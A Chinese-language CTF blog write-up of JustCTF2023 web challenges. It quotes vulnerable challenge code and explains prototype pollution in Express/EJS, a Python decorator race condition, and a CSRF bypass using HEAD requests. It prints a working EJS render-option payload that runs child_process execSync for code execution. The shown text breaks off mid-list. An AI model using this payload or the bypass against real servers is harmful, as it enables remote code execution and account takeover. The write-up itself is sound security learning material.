<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="JustCTF2023要求上班八小时，上了两个小时之后吃午饭时被食堂的顶级空调吹发烧了。。。不过不是很严重，但是就可以看完一道题后心安理得的下班了。一觉起来发现大家打到了第二，tnbl8。（一觉醒来感觉又好了 ，昨天还以为自己阳了） rmb感觉一个多小时就秒了两个十解以内的题，那是真的牛逼。是一场好歹学了点什么的比赛 Dangerous没看，ruby写的东西，好像是能leak数据然后签一个假ses">
<meta property="og:type" content="article">
<meta property="og:title" content="JustCTF2023">
<meta property="og:url" content="https://blog.z3ratu1.cn/JustCTF023.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="JustCTF2023要求上班八小时，上了两个小时之后吃午饭时被食堂的顶级空调吹发烧了。。。不过不是很严重，但是就可以看完一道题后心安理得的下班了。一觉起来发现大家打到了第二，tnbl8。（一觉醒来感觉又好了 ，昨天还以为自己阳了） rmb感觉一个多小时就秒了两个十解以内的题，那是真的牛逼。是一场好歹学了点什么的比赛 Dangerous没看，ruby写的东西，好像是能leak数据然后签一个假ses">
<meta property="og:locale">
<meta property="article:published_time" content="2023-06-05T03:31:41.000Z">
<meta property="article:modified_time" content="2023-06-05T06:34:52.200Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="JavaScript">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.z3ratu1.cn/JustCTF023.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>JustCTF2023 | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/JustCTF023.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          JustCTF2023
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-06-05 11:31:41 / 修改时间：14:34:52" itemprop="dateCreated datePublished" datetime="2023-06-05T11:31:41+08:00">2023-06-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
            </span>

          
            <span id="/JustCTF023.html" class="post-meta-item leancloud_visitors" data-flag-title="JustCTF2023" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/JustCTF023.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/JustCTF023.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="JustCTF2023"><a href="#JustCTF2023" class="headerlink" title="JustCTF2023"></a>JustCTF2023</h1><p>要求上班八小时，上了两个小时之后吃午饭时被食堂的顶级空调吹发烧了。。。不过不是很严重，但是就可以看完一道题后心安理得的下班了。一觉起来发现大家打到了第二，tnbl8。（一觉醒来感觉又好了 ，昨天还以为自己阳了）</p>
<p>rmb感觉一个多小时就秒了两个十解以内的题，那是真的牛逼。是一场好歹学了点什么的比赛</p>
<h2 id="Dangerous"><a href="#Dangerous" class="headerlink" title="Dangerous"></a>Dangerous</h2><p>没看，ruby写的东西，好像是能leak数据然后签一个假session并且用XFF伪造IP？</p>
<h2 id="eXtra-Safe-Security-layers"><a href="#eXtra-Safe-Security-layers" class="headerlink" title="eXtra Safe Security layers"></a>eXtra Safe Security layers</h2><p>花里胡哨的写了一堆，结果屁用没有。一开始看到那个顶级CSP我还在想无敌防御了，结果后面一个赋值直接给你清空了</p>
<pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>res<span class="token punctuation">.</span>user<span class="token punctuation">,</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>query <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// Safety layer 5</span>
    res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>user<span class="token punctuation">.</span>unmodifiable<span class="token punctuation">.</span>CSP <span class="token operator">?</span><span class="token operator">?</span> defaultCSP<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>属于是一键绕过所有防御，xss的点的属性名字叫unmodifiable，不是很懂名字叫这个难道就不能改了吗。骗小朋友呢</p>
<h2 id="Perfect-Product"><a href="#Perfect-Product" class="headerlink" title="Perfect Product"></a>Perfect Product</h2><p>我看的那个题。不是很难，然后我被耍了<br>核心代码就这点</p>
<pre class=" language-js"><code class="language-js">  <span class="token keyword">const</span> params <span class="token operator">=</span> req<span class="token punctuation">.</span>query <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">// console.log(req.body)</span>

  <span class="token keyword">let</span> name <span class="token operator">=</span> params<span class="token punctuation">.</span>name 
  <span class="token keyword">let</span> strings <span class="token operator">=</span> params<span class="token punctuation">.</span>v<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>strings <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'NaN'</span><span class="token punctuation">,</span> <span class="token string">'NaN'</span><span class="token punctuation">,</span> <span class="token string">'NaN'</span><span class="token punctuation">,</span> <span class="token string">'NaN'</span><span class="token punctuation">,</span> <span class="token string">'NaN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token comment" spellcheck="true">// make _0 to point to all strings, copy to prevent reference.</span>
  strings<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">// console.log(strings)</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> idx <span class="token keyword">in</span> strings<span class="token punctuation">)</span><span class="token punctuation">{</span>
    data<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>idx<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> strings<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre>
<p>开局一个ejs模板渲染，又是直接将整个对象作为渲染参数，这样子就和前段时间那个hxp的题目一模一样了，加上这里还有一个<code>_$&#123;idx&#125;</code>的赋值，一眼通过proto控制属性一键打通，直接赋值proto是不会污染原型链的，但是还是可以让当前对象访问到proto上的值，但是这里有一个<code>!(strings instanceof Array) &amp;&amp; !Array.isArray(strings)</code>顶级防御，我也就是被这里迷惑了</p>
<p><code>Array.isArray</code>是一个究极严格的校验，需要对象是被Array constructor或者array语法从字面量上创建出来的才行（mdn上写的很抽象，但是就是推荐使用这个并且检查顶级严格）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/isArray">Array.isArray</a><br>而instanceof就比较的松散，只要对象的原型链上存在这个类型就会认为成功，而这里的判断条件是与，也就意味着只要能构造出一个对象的原型链上存在一个array就能通过校验。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof">instanceof</a><br>例如<code>&#123;&quot;v&quot;:&#123;&quot;__proto__&quot;:[], &quot;attr&quot;:xxxx&#125; &#125;</code>，可惜的是，直接从控制台里创建这个对象是可以通过检验的，而写成string后走JSON.parse却不行，怎么回事呢<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">JSON.parse</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer">Object initializer</a></p>
<p>不得不说MDN的文档还是挺详细的，应有尽有</p>
<blockquote>
<p>JSON is a <em>strict subset</em> of the object literal syntax, meaning that every valid JSON text can be parsed as an object literal, and would likely not cause syntax errors. The only exception is that the object literal syntax prohibits duplicate <code>__proto__</code> keys, which does not apply to <a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse"><code>JSON.parse()</code></a>. The latter treats <code>__proto__</code> like a normal property and takes the last occurrence as the property’s value. The only time when the object value they represent (a.k.a. their semantic) differ is also when the source contains the <code>__proto__</code> key — for object literals, it sets the object’s prototype; for JSON, it’s a normal property.</p>
</blockquote>
<pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{ "__proto__": 0, "__proto__": 1 }'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// {__proto__: 1}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// SyntaxError: Duplicate __proto__ fields are not allowed in object literals</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{ "__proto__": {} }'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// { __proto__: {} }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// {} (with {} as prototype)</span>
</code></pre>
<p>简单的跟了一下bodyParser的json，也是走的JSON.parse。凉</p>
<p>最后是天哥发现从req.query能够直接构造出一个数组对象，并且还能给数组对象进行属性赋值，有点玄学。总之，后面的那个assign屁用没有，因为只有单层赋值，能够实现的就是将v覆盖掉。</p>
<p>这样子的话就能继续复用hxpctf中的payload了</p>
<pre class=" language-js"><code class="language-js">v<span class="token punctuation">[</span>__proto__<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">4</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>_proto__<span class="token punctuation">]</span><span class="token punctuation">[</span>settings<span class="token punctuation">]</span><span class="token punctuation">[</span>view<span class="token operator">%</span>20options<span class="token punctuation">]</span><span class="token punctuation">[</span>client<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>_proto__<span class="token punctuation">]</span><span class="token punctuation">[</span>settings<span class="token punctuation">]</span><span class="token punctuation">[</span>view<span class="token operator">%</span>20options<span class="token punctuation">]</span><span class="token punctuation">[</span>escape<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return+process.mainModule.require('child_process').execSync('/readflag')"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>_proto__<span class="token punctuation">]</span><span class="token punctuation">[</span>cache<span class="token punctuation">]</span><span class="token operator">=</span>
</code></pre>
<p>但是当时还是打不通，本地各种通远程各种不通，最后起了远程调试才发现，题目在启动的时候fetch了自己的product路由，进行了一次渲染，然后环境也和hxp的一样是production的，所以就没法再次渲染出可以利用的模板了。我本地调试的时候因为启动的时候会报一个fetch找不到的错，所以我把那行注释了。。。所以本地各种通</p>
<p>但是cache这个地方我在hxp的时候是看过的，当时得出的结论是无法控制（不知道脑子抽什么风了得出的结论。。。）再次回到那个赋值的点</p>
<pre class=" language-js"><code class="language-js">  <span class="token comment" spellcheck="true">// merge options</span>
  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// set .cache unless explicitly provided</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre>
<p>前面merge上去的opts就是我们可控的选项，直接给opts上面加一个为false的值就可以了。这里留了个空字符串，因为字符串0在在后续的if判断里也能是true。所以我当时是怎么说出来这里不可控的。。。</p>
<h2 id="Aquatic-Delights"><a href="#Aquatic-Delights" class="headerlink" title="Aquatic Delights"></a>Aquatic Delights</h2><p>rmb急速秒杀的两题之一，关键点在于题目的装饰器顺序</p>
<pre class=" language-python"><code class="language-python">@database_connection
@database_lock
</code></pre>
<p>先connection再lock，导致条件竞争的产生。题目的功能就是买卖，然后凑齐一个很高数额的钱就能买flag。竞争无非就是连着买多个只扣一份钱或者连着卖多个只消耗一份货。具体要看数据库的逻辑<br>这里的钱数是独立于数据库的，那就会出现卖操作时，多个卖操作同时读数据库，把卖得到的钱加上去后，将卖的结果写回数据库，导致一个商品被来回卖了几次，而钱数额外增长的情况。（同理，如果没有控制好买的频率，也可能导致一份商品被买了好几次白白亏钱。。。）</p>
<p>然后猛竞争即可，不过从rmb这里来看竞争成功率好像不是很高</p>
<p>这里还搜到一个关于装饰器执行顺序的话题，按照常理是从上往下，不过实际上还有那么一点的偏差，很有意思<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://segmentfault.com/a/1190000007837364">Python 装饰器执行顺序迷思</a></p>
<h2 id="Phantom"><a href="#Phantom" class="headerlink" title="Phantom"></a>Phantom</h2><p>rmb极速秒杀的第二个题，wp也写的很简短，但是我感觉还挺难的。。。<br>xss题，每个人只能写看自己的profile，profile有name和description两个字段，bot的名字就是flag，显然就是在description处xss了。由于每个人只能看自己的profile，就算在自己的页面上xss也没法给bot看，所以必然是一个csrf题，过题目也很贴心的把cookie的samesite设置成了none，但是这个题引入了一个csrf中间件，对各种页面都添加了csrf的保护，并且对输入还有一个校验。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">isSafeHTML</span><span class="token punctuation">(</span>input <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> buffer bytes<span class="token punctuation">.</span>Buffer
    tokenizer <span class="token operator">:=</span> html<span class="token punctuation">.</span><span class="token function">NewTokenizer</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token punctuation">{</span>
        tt <span class="token operator">:=</span> tokenizer<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">switch</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> tt <span class="token operator">==</span> html<span class="token punctuation">.</span>ErrorToken<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token keyword">case</span> tt <span class="token operator">==</span> html<span class="token punctuation">.</span>StartTagToken<span class="token punctuation">,</span> tt <span class="token operator">==</span> html<span class="token punctuation">.</span>EndTagToken<span class="token punctuation">,</span> tt <span class="token operator">==</span> html<span class="token punctuation">.</span>SelfClosingTagToken<span class="token punctuation">:</span>
            token <span class="token operator">:=</span> tokenizer<span class="token punctuation">.</span><span class="token function">Token</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>Attr<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">switch</span> token<span class="token punctuation">.</span>Data <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token string">"h2"</span><span class="token punctuation">,</span> <span class="token string">"h3"</span><span class="token punctuation">,</span> <span class="token string">"h4"</span><span class="token punctuation">,</span> <span class="token string">"h5"</span><span class="token punctuation">,</span> <span class="token string">"h6"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"img"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token string">"svg"</span><span class="token punctuation">,</span> <span class="token string">"textarea"</span><span class="token punctuation">:</span>
                buffer<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">case</span> tt <span class="token operator">==</span> html<span class="token punctuation">.</span>TextToken<span class="token punctuation">:</span>
            buffer<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>tokenizer<span class="token punctuation">.</span><span class="token function">Token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>但是我没有很理解这里只有ErrorToken返回true，然后token被接受的时候会把他写到一个不知道有什么用的buffer里。。。？</p>
<p>这个过滤暂且按下不表，考虑的是怎么样过这个csrf的防御。如果看的顶级仔细的话会发现，作者在绝大多数同时支持GET和POST方法的路由下，写出的判断是<code>if r.Method == http.MethodGet else if r.Method == http.MethodPost</code>，唯独在修改profile这个路由下是<code>if r.Method == http.MethodGet else</code>，也就意味着GET以外的所有请求类型都可以 被else后的分支处理，比如HEAD</p>
<p>但是这里还有另一个问题，也就是输入的参数是<code>r.FormValue(&quot;description&quot;)</code>，看起来非常的post，但是搜索一下就能发现这个是可以拿到query里面的值的。<br>如下是golang源码里的注释</p>
<blockquote>
<p>&#x2F;&#x2F; FormValue returns the first value for the named component of the query.<br>&#x2F;&#x2F; POST and PUT body parameters take precedence over URL query string values.<br>&#x2F;&#x2F; FormValue calls ParseMultipartForm and ParseForm if necessary and ignores<br>&#x2F;&#x2F; any errors returned by these functions.<br>&#x2F;&#x2F; If key is not present, FormValue returns the empty string.<br>&#x2F;&#x2F; To access multiple values of the same key, call ParseForm and<br>&#x2F;&#x2F; then inspect Request.Form directly.</p>
</blockquote>
<p>完成逻辑闭环，使用head方法绕过csrf并在query中携带payload一键打通</p>
<p>但是还有一个要考虑的点，是cors，如果是一个复杂请求的话，是会发送一个OPTIONS预检请求的，这里没配cors，如果发了options肯定是没法收到通过的结果的。所以还得确定一下什么情况下会触发预检请求，还是参看mdn</p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a></p>
<blockquote>
<p>A <em>simple request</em> is one that <strong>meets all the following conditions</strong>:</p>
<ul>
<li>One of the allowed methods:</li>
</ul>
</blockquote>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET"><code>GET</code></a></li>
